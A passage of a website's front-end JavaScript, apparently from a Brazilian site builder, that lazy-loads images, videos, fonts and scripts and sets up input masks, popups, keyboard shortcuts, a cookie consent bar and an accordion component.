            elemento: ".se_imagem",
            antecipacao: 600,
            executar: function(elemento) {
                if (window.innerWidth <= 800) var dispositivo = "mobile";
                else if (window.innerWidth > 800) dispositivo = "desktop";
                var imagem_download = new Image;
                imagem_download.src = "mobile" == dispositivo && elemento.getAttribute("ll_src_mobile") ? elemento.getAttribute("ll_src_mobile") : elemento.getAttribute("ll_src"), imagem_download.onload = function(e) {
                    elemento.getAttribute("ll_src_mobile"), elemento.getAttribute("ll_src");
                    elemento.removeAttribute("ll_src"), elemento.removeAttribute("ll_src_mobile"), elemento.querySelector("." + pagina_controle.classe_elemento_interno).removeAttribute("gpc_nome_imagem"), elemento.classList.remove("se_imagem"), elemento.children[0].innerHTML = '<div class="imagem_fundo"></div>'
                }
            }
        })
    }), 40), setTimeout((function() {
        GObserver.instalar({
            elemento: ".se_caixa",
            antecipacao: 500,
            executar: function(elemento) {
                if (window.innerWidth <= 800) var dispositivo = "mobile";
                else if (window.innerWidth > 800) dispositivo = "desktop";
                var elemento_carregando_src = "";
                if ("mobile" == dispositivo && elemento.getAttribute("ll_src_mobile") ? elemento_carregando_src = elemento.getAttribute("ll_src_mobile") : "desktop" == dispositivo && elemento.getAttribute("ll_src") && (elemento_carregando_src = elemento.getAttribute("ll_src")), elemento_carregando_src) {
                    var imagem_download = new Image;
                    imagem_download.src = elemento_carregando_src, imagem_download.onload = function(e) {
                        elemento.removeAttribute("ll_src"), elemento.removeAttribute("ll_src_mobile"), elemento.classList.remove("se_caixa")
                    }
                }
            }
        })
    }), 40), setTimeout((function() {
        GObserver.instalar({
            elemento: ".se_slider",
            antecipacao: 500,
            executar: function(elemento) {
                if (window.innerWidth <= 800) var dispositivo = "mobile";
                else if (window.innerWidth > 800) dispositivo = "desktop";
                var imagens = $(elemento).find(".imagem");
                imagens.length && imagens.each((function(i, imagem) {
                    var elemento_carregando_src = "";
                    if ("mobile" == dispositivo && imagem.getAttribute("ll_src_mobile") ? elemento_carregando_src = imagem.getAttribute("ll_src_mobile") : "desktop" == dispositivo && imagem.getAttribute("ll_src") && (elemento_carregando_src = imagem.getAttribute("ll_src")), elemento_carregando_src) {
                        var imagem_download = new Image;
                        imagem_download.src = elemento_carregando_src, imagem_download.onload = function(e) {
                            imagem.removeAttribute("ll_src"), imagem.removeAttribute("ll_src_mobile"), imagem.closest("." + pagina_controle.classe_elemento).classList.remove("se_slider"), imagem.classList.contains("gsi_clone") && (imagem.style.backgroundImage = "url(" + elemento_carregando_src + ")")
                        }
                    }
                }))
            }
        })
    }), 400), setTimeout((function() {
        GObserver.instalar({
            elemento: ".ll_background",
            antecipacao: 500,
            executar: function(elemento) {
                if (window.innerWidth <= 800) var dispositivo = "mobile";
                else if (window.innerWidth > 800) dispositivo = "desktop";
                var elemento_carregando_src = "";
                if ("mobile" == dispositivo && elemento.getAttribute("ll_src_mobile") ? elemento_carregando_src = elemento.getAttribute("ll_src_mobile") : "desktop" == dispositivo && elemento.getAttribute("ll_src") && (elemento_carregando_src = elemento.getAttribute("ll_src")), elemento_carregando_src) {
                    var background_download = new Image;
                    background_download.src = elemento_carregando_src, background_download.onload = function(e) {
                        elemento.removeAttribute("ll_src"), elemento.removeAttribute("ll_src_mobile"), elemento.classList.remove("ll_background")
                    }
                } else elemento.removeAttribute("ll_src"), elemento.removeAttribute("ll_src_mobile"), elemento.classList.remove("ll_background")
            }
        })
    }), 50), window.getCrawler() || setTimeout((function() {
        GObserver.instalar({
            elemento: ".se_video",
            antecipacao: 0,
            executar: function(elemento) {
                if (0 == document.getElementById(elemento.getAttribute("id")).getElementsByTagName("iframe").length) {
                    var animacao_nome = elemento.querySelector(".carregando").getAttribute("data-animation-nome") ? elemento.querySelector(".carregando").getAttribute("data-animation-nome") : "none",
                        animacao_duration = elemento.querySelector(".carregando").getAttribute("data-animation-duration") ? elemento.querySelector(".carregando").getAttribute("data-animation-duration") : 1e3,
                        animacao_delay = elemento.querySelector(".carregando").getAttribute("data-animation-delay") ? elemento.querySelector(".carregando").getAttribute("data-animation-delay") : 0,
                        animacao_repeat = "loop" == elemento.querySelector(".carregando").getAttribute("data-animation-repeat") ? "infinite" : "show",
                        video_download = document.createElement("iframe");
                    video_download.setAttribute("src", elemento.getAttribute("ll_src")), video_download.setAttribute("frameborder", 0), video_download.setAttribute("allowfullscreen", ""), video_download.setAttribute("mozallowfullscreen", ""), video_download.setAttribute("webkitallowfullscreen", ""), video_download.setAttribute("allow", "accelerometer;autoplay;picture-in-picture"), video_download.setAttribute("class", "c e_video"), video_download.setAttribute("data-animation-nome", animacao_nome), video_download.setAttribute("data-animation-duration", animacao_duration), video_download.setAttribute("data-animation-delay", animacao_delay), video_download.setAttribute("data-animation-repeat", animacao_repeat), video_download.onload = function() {
                        document.getElementById(elemento.getAttribute("id")).querySelector(".carregando") && document.getElementById(elemento.getAttribute("id")).querySelector(".carregando").remove(), elemento.removeAttribute("ll_src"), elemento.classList.remove("se_video")
                    }, video_download.onreadystatechange = function() {
                        document.getElementById(elemento.getAttribute("id")).querySelector(".carregando") && document.getElementById(elemento.getAttribute("id")).querySelector(".carregando").remove(), "complete" == this.readyState && (elemento.removeAttribute("ll_src"), elemento.classList.remove("se_video"))
                    }, document.getElementById(elemento.getAttribute("id")).appendChild(video_download)
                }
            }
        })
    }), 400)
}

function InserirFontes(acao) {
    if (gle_fontes.elementos.length)
        for (var i = 0; i < gle_fontes.elementos.length; i++) {
            ! function(index) {
                var elemento = $(gle_fontes.elementos[index]);
                gle_fontes.elementos.splice(index, 1);
                var fonte = document.createElement("link");
                fonte.href = elemento.attr("gle_href"), fonte.rel = "stylesheet", fonte.media = "all", fonte.onload = function() {
                    elemento.remove(), gle_fontes.carregados++, CarregarFontes(), InserirFontes(acao)
                }, fonte.onerror = function() {
                    elemento.remove(), gle_fontes.carregados++, CarregarFontes(), InserirFontes(acao)
                }, fonte.onreadystatechange = function() {
                    "complete" == this.readyState && (elemento.remove(), gle_fontes.carregados++, CarregarFontes(), InserirFontes(acao))
                }, document.head.appendChild(fonte)
            }(i);
            break
        }
}

function CarregarFontes() {
    var fontes_carregar = $(".se_fonte, .se_contador");
    if (fontes_carregar.length)
        for (var i = 0; i < fontes_carregar.length; i++) $(fontes_carregar[i]).hasClass("se_fonte") ? $(fontes_carregar[i]).removeClass("se_fonte") : $(fontes_carregar[i]).removeClass("se_contador")
}

function InserirCss(acao) {
    if (gle_css.length)
        for (var i = 0; i < gle_css.length; i++) {
            ! function(index) {
                var elemento = $(gle_css[index]);
                gle_css.splice(index, 1);
                for (var fonte = document.createElement("link"), x = 0; x < elemento[0].attributes.length; x++) "rel" != elemento[0].attributes[x].nodeName && fonte.setAttribute(elemento[0].attributes[x].nodeName.replace("gle_", ""), elemento[0].attributes[x].nodeValue.replace("gle_css", ""));
                fonte.onload = function() {
                    elemento.remove(), InserirCss(acao)
                }, fonte.onerror = function() {
                    elemento.remove(), InserirCss(acao)
                }, fonte.onreadystatechange = function() {
                    "complete" == this.readyState && (elemento.remove(), InserirCss(acao))
                }, document.body.appendChild(fonte)
            }(i);
            break
        }
}

function InserirScripts(acao) {
    if (gle_scripts.elementos.length)
        for (var i = 0; i < gle_scripts.elementos.length; i++) {
            ! function(index) {
                var elemento = $(gle_scripts.elementos[index]);
                if ((elemento.attr("href").indexOf("gtag") || elemento.attr("href").indexOf("fbevents")) && window.getCrawler()) return elemento.remove(), void InserirScripts(acao);
                gle_scripts.elementos.splice(index, 1);
                for (var script = document.createElement("script"), x = 0; x < elemento[0].attributes.length; x++) {
                    let valor = elemento[0].attributes[x].nodeValue;
                    "href" != elemento[0].attributes[x].nodeName && (valor = valor.replace(/dns-prefetch\s+?/gm, ""), valor = valor.replace(/\s+?dns-prefetch/gm, ""), valor = valor.replace(/preconnect\s+?/gm, ""), valor = valor.replace(/\s+?preconnect/gm, ""), valor = valor.replace("dns-prefetch", ""), valor = valor.replace("preconnect", ""), valor = valor.replace("gle_scripts", ""), "async" != elemento[0].attributes[x].nodeName && script.setAttribute(elemento[0].attributes[x].nodeName, valor))
                }
                script.src = elemento.attr("href"), script.type = "text/javascript", script.defer = !0, script.onload = function() {
                    elemento.remove(), gle_scripts.carregados++, gle_scripts.encontrados == gle_scripts.carregados && "iniciar" == acao && null != window.InserirScriptsInline && InserirScriptsInline(), InserirScripts(acao)
                }, script.onerror = function() {
                    elemento.remove(), gle_scripts.carregados++, gle_scripts.encontrados == gle_scripts.carregados && "iniciar" == acao && null != window.InserirScriptsInline && InserirScriptsInline(), InserirScripts(acao)
                }, script.onreadystatechange = function() {
                    "complete" == this.readyState && (elemento.remove(), gle_scripts.carregados++, gle_scripts.encontrados == gle_scripts.carregados && "iniciar" == acao && null != window.InserirScriptsInline && InserirScriptsInline(), InserirScripts(acao))
                }, document.body.appendChild(script)
            }(i);
            break
        }
}

function bindEvents() {
    var caixa = $("gmf").last().attr("id");
    caixa = null != caixa ? "#" + caixa + " " : "", GFM.instalar({
        elemento: ".telefone",
        mascara: "(00) 0000-00009",
        placeholder: "(__) ____-_____"
    }), GFM.instalar({
        elemento: "#celular",
        mascara: "(00) 0000-00009",
        placeholder: "(__) ____-_____"
    }), GFM.instalar({
        elemento: "input.cnpj",
        mascara: "00.000.000/0000-00",
        placeholder: "__.___.___/____-__"
    }), GFM.instalar({
        elemento: "input.cpf",
        mascara: "000.000.000-00",
        placeholder: "___.___.___-__"
    }), GFM.instalar({
        elemento: "input.hora",
        mascara: "00:00",
        placeholder: "__:__"
    }), GFM.instalar({
        elemento: "input.data",
        mascara: "00/00/0000",
        placeholder: "__/__/____"
    }), GFM.instalar({
        elemento: "input.datahora",
        mascara: "00/00/0000 00:00",
        placeholder: "__/__/____ __:__"
    }), GTooltip.instalar({
        elemento: ".gtt-direita",
        direcao: "direita"
    }), GTooltip.instalar({
        elemento: ".gtt-esquerda",
        direcao: "esquerda"
    }), GTooltip.instalar({
        elemento: ".gtt-cima",
        direcao: "cima"
    }), GTooltip.instalar({
        elemento: ".gtt-baixo",
        direcao: "baixo"
    }), GTooltip.instalar({
        elemento: ".balao_direita",
        direcao: "direita"
    }), GTooltip.instalar({
        elemento: ".balao_esquerda",
        direcao: "esquerda"
    }), GTooltip.instalar({
        elemento: ".balao_cima",
        direcao: "cima"
    }), GTooltip.instalar({
        elemento: ".balao_baixo",
        direcao: "baixo"
    })
}

function Mobile() {
    return !!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
}
setTimeout((function() {
    GAccordion.instalar()
}), 600), window.smoothScrollTo = function(endX, endY, duration) {
    let startX = window.scrollX || window.pageXOffset,
        startY = window.scrollY || window.pageYOffset,
        distanceX = endX - startX,
        distanceY = endY - startY,
        startTime = (new Date).getTime(),
        easeInOutQuart = function(time, from, distance, duration) {
            return (time /= duration / 2) < 1 ? distance / 2 * time * time * time * time + from : -distance / 2 * ((time -= 2) * time * time * time - 2) + from
        },
        timer = window.setInterval((function() {
            let time = (new Date).getTime() - startTime,
                newX = easeInOutQuart(time, startX, distanceX, duration),
                newY = easeInOutQuart(time, startY, distanceY, duration);
            time >= duration && window.clearInterval(timer), window.scrollTo(newX, newY)
        }), 1e3 / 60)
}, $((function() {
    function Links(botao, tipo) {
        if (null == tipo && (tipo = ""), "externo" == tipo) setTimeout((function() {
            var link = $(botao).attr("href");
            if (-1 == link.indexOf("https://") && -1 == link.indexOf("http://") && -1 == link.indexOf("tel:") && -1 == link.indexOf("mailto:") && -1 == link.indexOf("sms:") && link && (link = "https://" + link), null != $(botao).attr("target") && "_blank" == $(botao).attr("target")) window.open(link, "_blank");
            else window.open(link, "_self")
        }), 200);
        else if ("interno" == tipo) {
            var link = $(botao);
            if (void 0 !== link.attr("data-bloco-mobile") && $(window).width() < 720) {
                var bloco = link.attr("data-bloco-mobile");
                $("#" == bloco.substr(0, 1) ? bloco : "#" + bloco).length || (bloco = link.attr("data-bloco"))
            } else bloco = link.attr("data-bloco");
            if (null != bloco && $("#" == bloco.substr(0, 1) ? bloco : "#" + bloco).length) {
                var offset = $("#" == bloco.substr(0, 1) ? bloco : "#" + bloco).offset();
                "scrollBehavior" in document.documentElement.style ? window.scroll({
                    top: offset.top - 60,
                    behavior: "smooth"
                }) : smoothScrollTo(0, offset.top - 60, 600)
            }
        } else if ("popup" == tipo) {
            var elemento = $(botao),
                conteudo = elementos_popup[elemento.attr("id")].conteudo;
            null != conteudo && "" != conteudo || (conteudo = "<div></div>"), gm_quantidade++;
            var configuracao = {
                gm: {
                    conteudos: {
                        topo: {
                            conteudo: "<div class='gpc_modal_popup-topo-fechar icone-fechar'></div>",
                            estilos: "",
                            extras: ""
                        },
                        centro: {
                            conteudo: conteudo,
                            estilos: "",
                            extras: ""
                        },
                        rodape: {
                            conteudo: "<div></div>",
                            estilos: "",
                            extras: ""
                        }
                    },
                    classes: "gpc_modal",
                    estilos: elementos_popup[elemento.attr("id")].estilos[$(window).width() > 960 ? "desktop" : "mobile"],
                    extras: 'gpc_id_elemento="' + elemento.attr("id") + '"'
                },
                gm_fundo: {
                    conteudos: {
                        topo: {
                            conteudo: "<div class='gpc_modal_popup-fundo-fechar icone-fechar'></div>"
                        }
                    },
                    classes: "gpc_modal-fundo",
                    estilos: "overflow:hidden;",
                    extras: 'gm_fundo_acao="fechar"'
                }
            };
            AbrirGM("gpc_modal_" + gm_quantidade, "gpc_modal_popup", configuracao), setTimeout((function() {
                GSlideImage.iniciar(), GAccordion.instalar(), GreatLoader("atualizar"), GreatFontes(!0), bindEvents()
            }), 400)
        }
    }
    GLoading.carregar({
        ativar: !1
    }), $("body").removeClass("preload"), bindEvents(), $(".mensagem_fechar").on("click", (function(evento) {
        $(".mensagens").removeAttr("style")
    })), $(document).on("keydown", (function(e) {
        var tecla = e.keyCode ? e.keyCode : e.which;
        if ($(".gm").length) {
            var caixa = $(".gm").last().attr("id"),
                caixa_andamento = $("#" + caixa).find(".gmf-andamento");
            if (e.ctrlKey && 83 == tecla) return e.preventDefault(), e.stopPropagation(), caixa_andamento.length ? caixa_andamento.attr("caixa_passos_controle") == caixa_andamento.attr("caixa_passos_quantidade") - 1 ? $("#" + caixa + " #enviar_formulario_ajax").trigger("click") : PassosGMF(caixa, "proximo") : $("#" + caixa + " #enviar_formulario_ajax").trigger("click"), !1;
            if (27 == tecla) return e.preventDefault(), e.stopPropagation(), "gsp" == $("#" + caixa).attr("gm_componente") ? FecharGSP(caixa) : "gmf" == $("#" + caixa).attr("gm_componente") ? $("#" + caixa + " .gmf-topo-fechar").click() : "guo" == $("#" + caixa).attr("gm_componente") || "gd" == $("#" + caixa).attr("gm_componente") ? PulsarGM($("#" + caixa).attr("id")) : "gmi" == $("#" + caixa).attr("gm_componente") ? (gmi_caixa.elemento = "", gmi_caixa_imagem.elemento = "", gmi_fundo.elemento = "", FecharGM(caixa)) : FecharGM(caixa), !1
        } else if (e.ctrlKey && 83 == tecla) return e.preventDefault(), e.stopPropagation(), $("#editar_formulario").length ? $("#editar_formulario").trigger("click") : $("#enviar_formulario").length ? $("#enviar_formulario").trigger("click") : $(".admin_botao-login").length ? $(".admin_botao-login").trigger("click") : $(".admin_botao-esqueci_minha_senha").length && $(".admin_botao-esqueci_minha_senha").trigger("click"), !1;
        if (e.ctrlKey && 85 == tecla || 123 == tecla) return e.preventDefault(), e.stopPropagation(), !1
    })), $("body").on("click", ".botao_evento", (function(e) {
        return e.preventDefault(), e.stopPropagation(), elementos_botoes_evento[$(this).parent().attr("id")].conteudo(), !1
    })), $("body").on("click", ".link_popup", (function(e) {
        if (e.preventDefault(), e.stopPropagation(), $(this).closest("." + pagina_controle.classe_elemento)) var elemento = $(this).closest("." + pagina_controle.classe_elemento);
        else elemento = $(this).closest("." + pagina_controle.classe_elemento_antigo);
        return Links(elemento, "popup"), !1
    })), $("body").on("click", ".gpc_modal_popup-topo-fechar, .gpc_modal_popup-fundo-fechar", (function(e) {
        FecharGM($(".gpc_modal").last().attr("id"))
    })), $("body").on("click", ".link_interno", (function(e) {
        if (e.preventDefault(), e.stopPropagation(), $(this).closest("." + pagina_controle.classe_elemento)) $(this).closest("." + pagina_controle.classe_elemento);
        else $(this).closest("." + pagina_controle.classe_elemento_antigo);
        return Links($(this), "interno"), !1
    })), $("body").on("click", ".link_externo", (function(e) {
        if (e.preventDefault(), e.stopPropagation(), $(this).closest("." + pagina_controle.classe_elemento)) $(this).closest("." + pagina_controle.classe_elemento);
        else $(this).closest("." + pagina_controle.classe_elemento_antigo);
        return Links($(this), "externo"), !1
    })), window.getCrawler() || GModalApproval.instalar({
        barra: {
            cor: "ffffff",
            classe: "",
            texto: "Usamos cookies para personalizar conteúdos e melhorar a sua experiência.",
            botao_configurar: !1,
            botao_aceitar: "Ok, entendi",
            fechar: !1,
            editar_consentimento: !1
        },
        opcoes: [{
            titulo: "Cookies obrigatórios",
            texto: "Eles são cookies para garantir o funcionamento adequado do site.",
            aviso: "Sempre ativo",
            id: "o"
        }],
        dominio: ".gointegra.com.br",
        editado: !!GModalApproval.preferencias()
    })
}));
var gac_timeout_resize, gac_timeout = {},
    GAccordion = {
        instalar: function(id) {
            let instancias;
            if (instancias = null != id ? document.querySelectorAll("#" + id + " .gac") : document.querySelectorAll(".gac"), instancias)
                for (var i = 0; i < instancias.length; i++) {
                    id = instancias[i].closest(".gpc-e, .gpc-blocos_bloco_elemento").getAttribute("id");
                    let ja_iniciado = !1,
                        abrir_primeiro = !1;
                    "true" == instancias[i].getAttribute("gac-abrir_primeiro") && (abrir_primeiro = !0);
                    let itens = instancias[i].querySelectorAll(".gac-item_cabecalho");
                    if (instancias[i].parentElement.classList.contains("gpc-e") && (ja_iniciado = instancias[i].classList.contains("gac-ativo"), instancias[i].classList.add("gac-ativo")), itens) {
                        if (!ja_iniciado)
                            for (var x = 0; x < itens.length; x++) {
                                let atual = itens[x];
                                document.getElementById(id).classList.contains("gpc-e") ? itens[x].addEventListener("click", (function() {
                                    GAccordion.abrir(atual.closest(".gpc-e").getAttribute("id"), atual)
                                }), !1) : (atual.closest(".gac-item").classList.remove("gac-aberto"), atual.closest(".gac-item").querySelector(".gac-item_conteudo").style.height = "", atual.closest(".gpc-blocos_bloco_elemento") && (atual.style.color = atual.closest(".gac").getAttribute("data-color"), atual.style.backgroundColor = atual.closest(".gac").getAttribute("data-background-color")))
                            }
                        if (instancias[i].closest(".gpc-e")) {
                            let visivel = getComputedStyle(instancias[i].closest(".gpc-e"));
                            abrir_primeiro && "visible" === visivel.visibility && "block" === visivel.display && GAccordion.abrir(itens[0].closest(".gpc-e").getAttribute("id"), itens[0], !0)
                        }
                    }
                }
        },
        abrir: function(id, item, primeiro) {
            null == primeiro && (primeiro = !1);
            let instancia = document.querySelector("#" + id);
            if (instancia)
                if (item.closest(".gac-item").classList.contains("gac-aberto") && !primeiro) GAccordion.fechar(id, item);
                else {
                    let versao = "desktop";
                    window.innerWidth < 800 && (versao = "mobile");
                    let item_ativo_altura = instancia.querySelector(".gac-aberto");
                    item_ativo_altura = item_ativo_altura ? item_ativo_altura.querySelector(".gac-item_conteudo").offsetHeight : 0;
                    let abertos = document.querySelectorAll(".gac-aberto");
                    if (abertos && !primeiro)
                        for (var i = 0; i < abertos.length; i++) abertos[i].closest(".gpc-e") && (abertos[i].closest(".gpc-b") ? abertos[i].closest(".gpc-b").getAttribute("id") == abertos[i].closest(".gpc-b").getAttribute("id") && GAccordion.fechar(abertos[i].closest(".gpc-e").getAttribute("id"), abertos[i], !0) : abertos[i].closest(".gpc_modal") && GAccordion.fechar(abertos[i].closest(".gpc-e").getAttribute("id"), abertos[i]));
                    item.closest(".gac-item").classList.add("gac-aberto");
                    let conteudo = item.closest(".gac-item").querySelector(".gac-item_conteudo"),
                        tamanho_conteudo = conteudo.scrollHeight;
                    if (conteudo.style.height = tamanho_conteudo + "px", instancia.closest(".gpc-blocos_bloco_elemento")) {
                        let itens = instancia.querySelectorAll(".gac-item_cabecalho");
                        for (var x = 1; x < itens.length; x++) itens[x].closest(".gac-item").classList.remove("gac-aberto"), itens[x].closest(".gac-item").querySelector(".gac-item_cabecalho").style.color = itens[0].closest(".conteudo").getAttribute("data-color"), itens[x].closest(".gac-item").querySelector(".gac-item_cabecalho").style.backgroundColor = itens[0].closest(".conteudo").getAttribute("data-background-color"), itens[x].closest(".gac-item").querySelector(".gac-item_conteudo").style.height = "";
                        itens[0].closest(".gac-item").querySelector(".gac-item_cabecalho").style.color = itens[0].closest(".conteudo").getAttribute("data-color-hover"), itens[0].closest(".gac-item").querySelector(".gac-item_cabecalho").style.backgroundColor = itens[0].closest(".conteudo").getAttribute("data-background-color-hover"), itens[0].closest(".gac-item").querySelector(".gac-item_conteudo").style.color = itens[0].closest(".conteudo").getAttribute("data-color-texto"), itens[0].closest(".gac-item").querySelector(".gac-item_conteudo").style.backgroundColor = itens[0].closest(".conteudo").getAttribute("data-background-color-hover")
                    }
                    if (!instancia.closest(".gpc-b") && !instancia.closest(".gpc_modal") || document.querySelectorAll("#admin_centro").length) {
                        let elementos, bloco, elemento = instancia.closest(".gpc-blocos_bloco_elemento"),
                            rotacao = GAccordion.rotacao(getComputedStyle(elemento).transform),
                            dif = GAccordion.calcularAjuste(rotacao, tamanho_conteudo);
                        if (tamanho_conteudo += dif.deltaY, conteudo.style.transition = 0 != rotacao ? "none" : "", elemento.style.transform = `translate(${dif.deltaX}px, ${dif.deltaY}px) rotate(${rotacao}deg)`, instancia.closest(".gpc_modal") ? (elementos = instancia.closest(".gpc_modal").querySelectorAll(".gpc-blocos_bloco_elemento"), bloco = instancia.closest(".gpc_modal")) : (elementos = instancia.closest(".gpc-blocos_bloco_interno").querySelectorAll(".gpc-blocos_bloco_elemento"), bloco = instancia.closest(".gpc-blocos_bloco_interno")), elementos) {
                            let total_elementos = elementos.length;
                            for (i = 0; i < total_elementos; i++) elementos[i].getAttribute("id") != item.closest(".gpc-blocos_bloco_elemento").getAttribute("id") && (elementos[i].classList.add("gac-movendo"), parseFloat(elementos[i].offsetTop) >= item.closest(".gpc-blocos_bloco_elemento").offsetTop + item.closest(".gpc-blocos_bloco_elemento").offsetHeight && elementos[i].getAttribute("id") != item.closest(".gpc-blocos_bloco_elemento").getAttribute("id") && elementos[i].offsetParent && (elementos[i].style.top = parseFloat(elementos[i].style.top) + tamanho_conteudo + "px"))
                        }
                        bloco.classList.add("gac-movendo"), bloco.style.setProperty("height", parseFloat(bloco.style.height) + tamanho_conteudo + "px"), instancia.closest(".gpc_modal") && PosicionarGM(instancia.closest(".gpc_modal").getAttribute("id"), !1);
                        for (let i = 0; i < 8; i++) setTimeout((function() {
                            gpc_controle.elementos_iniciados.elemento.updateRect()
                        }), 40 * i)
                    } else {
                        let elemento = instancia.closest(".gpc-e"),
                            rotacao = GAccordion.rotacao(getComputedStyle(elemento).transform),
                            dif = GAccordion.calcularAjuste(rotacao, tamanho_conteudo);
                        elemento.style.transform = `translate(${dif.deltaX}px, ${dif.deltaY}px) rotate(${rotacao}deg)`, conteudo.style.transition = 0 != rotacao ? "none" : "", tamanho_conteudo += dif.deltaY, 90 != rotacao && 270 != rotacao || (tamanho_conteudo = 0);
                        let id_bloco = instancia.closest(".gpc-b") ? instancia.closest(".gpc-b").getAttribute("id") : instancia.closest(".gpc_modal").getAttribute("gpc_id_elemento"),
                            elementos = instancia.closest(".centralizar, .gpc_modal").querySelectorAll(".gpc-e");
                        if (elementos) {
                            let total_elementos = elementos.length;
                            for (var i = 0; i < total_elementos; i++) elementos[i].getAttribute("id") != item.closest(".gpc-e").getAttribute("id") && (elementos[i].classList.add("gac-movendo"), parseFloat(elementos_posicao[elementos[i].getAttribute("id")][versao]) >= item.closest(".gpc-e").offsetTop + item.closest(".gpc-e").offsetHeight - item_ativo_altura && elementos[i].getAttribute("id") != item.closest(".gpc-e").getAttribute("id") && elementos[i].offsetParent ? elementos[i].style.top = elementos_posicao[elementos[i].getAttribute("id")][versao] + tamanho_conteudo + "px" : null == elementos[i].offsetParent && (elementos[i].style.top = ""))
                        }
                        instancia.closest(".gpc-b, .gpc_modal").classList.add("gac-movendo"), instancia.closest(".gpc-b, .gpc_modal").style.setProperty("height", blocos_posicao[id_bloco][versao] + tamanho_conteudo + "px", "important"), instancia.closest(".gpc_modal") && PosicionarGM(instancia.closest(".gpc_modal").getAttribute("id"), !1)
                    }
                }
        },
        fechar: function(id, item, abrir_outro) {
            let instancia = document.querySelector("#" + id);
            if (null == abrir_outro && (abrir_outro = !1), instancia) {
                if (gac_timeout.hasOwnProperty(id) && (clearTimeout(gac_timeout[id]), delete gac_timeout[id]), instancia.closest(".gpc-blocos_bloco_elemento")) {
                    let itens = item.closest(".gac").querySelectorAll(".gac-item_cabecalho");
                    for (var x = 0; x < itens.length; x++) itens[x].closest(".gac-item").classList.remove("gac-aberto"), itens[x].closest(".gac-item").querySelector(".gac-item_cabecalho").style.color = item.closest(".gac").getAttribute("data-color"), itens[x].closest(".gac-item").querySelector(".gac-item_cabecalho").style.backgroundColor = item.closest(".gac").getAttribute("data-background-color"), itens[x].closest(".gac-item").querySelector(".gac-item_conteudo").style.height = ""
                }
                let versao = "desktop";
                if (window.innerWidth < 800 && (versao = "mobile"), item.closest(".gac-item").classList.remove("gac-aberto"), item.closest(".gac-item").querySelector(".gac-item_conteudo").style.height = "", !instancia.closest(".gpc-b") && !instancia.closest(".gpc_modal") || document.querySelectorAll("#admin_centro").length) {
                    let elementos, bloco, elemento = instancia.closest(".gpc-blocos_bloco_elemento"),
                        rotacao = GAccordion.rotacao(getComputedStyle(elemento).transform);
                    if (elemento.style.transform = `translate(0px, 0px) rotate(${rotacao}deg)`, versao = "", document.getElementById("gpc-blocos").classList.contains("mobile") && (versao = "_mobile"), instancia.closest(".gpc_modal") ? (elementos = instancia.closest(".gpc_modal").querySelectorAll(".gpc-blocos_bloco_elemento"), bloco = instancia.closest(".gpc_modal")) : (elementos = instancia.closest(".gpc-blocos_bloco_interno").querySelectorAll(".gpc-blocos_bloco_elemento"), bloco = instancia.closest(".gpc-blocos_bloco_interno")), elementos) {
                        let total_elementos = elementos.length;
                        for (i = 0; i < total_elementos; i++) parseFloat(elementos[i].style.top) >= parseFloat(instancia.style.top) + parseFloat(getComputedStyle(instancia).height) && elementos[i].getAttribute("id") != id && elementos[i].offsetParent && elementos[i].setAttribute("style", elementos_pagina[elementos[i].getAttribute("gpc_id_elemento")]["estilos" + versao])
                    }
                    bloco.setAttribute("style", blocos_pagina[bloco.getAttribute("gpc_id_bloco")]["estilos" + versao]), instancia.closest(".gpc_modal") && PosicionarGM(instancia.closest(".gpc_modal").getAttribute("id"), !1);
                    for (let i = 0; i < 8; i++) setTimeout((function() {
                        gpc_controle.elementos_iniciados.elemento.updateRect()
                    }), 40 * i)
                } else {
                    let elemento = instancia.closest(".gpc-e"),
                        rotacao = GAccordion.rotacao(getComputedStyle(elemento).transform),
                        elementos = instancia.closest(".centralizar, .gpc_modal").querySelectorAll(".gpc-e");
                    if (elementos) {
                        let total_elementos = elementos.length;
                        for (var i = 0; i < total_elementos; i++) elementos[i].classList.add("gac-movendo"), elementos[i].getAttribute("id") == item.closest(".gpc-e").getAttribute("id") || abrir_outro || parseFloat(elementos[i].offsetTop) != elementos_posicao[elementos[i].getAttribute("id")][versao] && elementos[i].getAttribute("id") != id && elementos[i].offsetParent && (elementos[i].style.top = "")
                    }
                    elemento.style.transform = `translate(0px, 0px) rotate(${rotacao}deg)`, instancia.closest(".gpc-b, .gpc_modal").style.height = "", instancia.closest(".gpc_modal") && PosicionarGM(instancia.closest(".gpc_modal").getAttribute("id"), !1)
                }
                let elementos = document.querySelectorAll(".gac-movendo");
                if (elementos)
                    for (i = 0; i < elementos.length; i++) elementos[i].classList.remove("gac-movendo")
            }
        },
        resize: function(id) {
            if (document.querySelectorAll("#admin_centro").length) return !1;
            let instancias;
            if (instancias = null != id ? document.querySelectorAll("#" + id + " .gac") : document.querySelectorAll(".gac"), instancias) {
                let versao = "desktop";
                window.innerWidth < 800 && (versao = "mobile");
                for (var i = 0; i < instancias.length; i++) {
                    id = instancias[i].closest(".gpc-e").getAttribute("id");
                    let itens = instancias[i].querySelectorAll(".gac-aberto"),
                        tamanho_conteudo = 0;
                    if (itens)
                        for (var x = 0; x < itens.length; x++) {
                            let atual = itens[x],
                                conteudo = atual.closest(".gac-item").querySelector(".gac-item_conteudo");
                            if (conteudo.style.height = "auto", tamanho_conteudo = conteudo.scrollHeight, atual.closest(".gpc-b") || atual.closest(".gpc_modal")) {
                                let id_bloco = atual.closest(".gpc-b") ? atual.closest(".gpc-b").getAttribute("id") : atual.closest(".gpc_modal").getAttribute("gpc_id_elemento"),
                                    elementos = atual.closest(".centralizar, .gpc_modal").querySelectorAll(".gpc-e");
                                if (elementos) {
                                    let total_elementos = elementos.length;
                                    for (var y = 0; y < total_elementos; y++) elementos[y].classList.add("gac-movendo"), (parseFloat(elementos[y].offsetTop) >= atual.closest(".gpc-e").offsetTop + atual.closest(".gpc-e").offsetHeight - tamanho_conteudo || null == elementos[y].offsetParent) && elementos[y].getAttribute("id") != atual.closest(".gpc-e").getAttribute("id") && (elementos[y].style.top = elementos_posicao[elementos[y].getAttribute("id")][versao] + tamanho_conteudo + "px")
                                }
                                atual.closest(".gpc-b, .gpc_modal").classList.add("gac-movendo"), atual.closest(".gpc-b, .gpc_modal").style.setProperty("height", blocos_posicao[id_bloco][versao] + tamanho_conteudo + "px", "important"), atual.closest(".gpc_modal") && PosicionarGM(atual.closest(".gpc_modal").getAttribute("id"), !1)
                            }
                        }
                }
            }
        },
        rotacao: function(transform) {
            const resultados = transform.match(/matrix\(([^,]+),\s*([^,]+),\s*([^,]+),\s*([^,]+),\s*([^,]+),\s*([^)]+)\)/);
